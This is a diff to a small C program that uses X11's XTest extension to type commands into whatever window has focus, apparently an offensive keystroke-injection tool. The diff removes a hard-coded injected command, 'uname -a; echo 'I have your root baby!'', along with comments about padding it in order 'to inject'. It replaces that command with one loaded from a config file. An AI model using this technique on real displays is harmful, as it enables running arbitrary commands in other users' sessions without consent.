@@ -11,6 +11,8 @@ Edi
 #include <X11/Xlib.h>
 #include <X11/extensions/XTest.h>
 #include <X11/keysym.h>
+#include "../lib/ice_config.h"
+
 
 Display *display;
 int foo;
@@ -56,9 +58,14 @@ void erase(unsigned times, unsigned delay)
 
 int main(int argc, char **argv)
 {
-// use ten blank spaces and append with command CMD that you need to inject
-// why ten blank space ? have dragons in lib Xtst, its crazy 	
-	char *CMD="          uname -a; echo 'I have your root baby!'";
+	char *CMD=ice_config_load("cmd.cfg");
+ 	
+	if(CMD==NULL)
+	{
+		puts("error in config");
+		exit(0);
+	}	
+		
 		if((display=XOpenDisplay(NULL)) == NULL) 
 		{
     			fprintf(stderr, "%s: can't open %s\n", argv[0], XDisplayName(NULL));
@@ -84,7 +91,8 @@ int main(int argc, char **argv)
   	sleep(1);
 // if  you need erase the current verbose  of term try that function erase()
 //  erase(21, 100);
+	free(CMD);
 
   	XCloseDisplay(display);
-  	return 0;
+  	exit(0);
 }
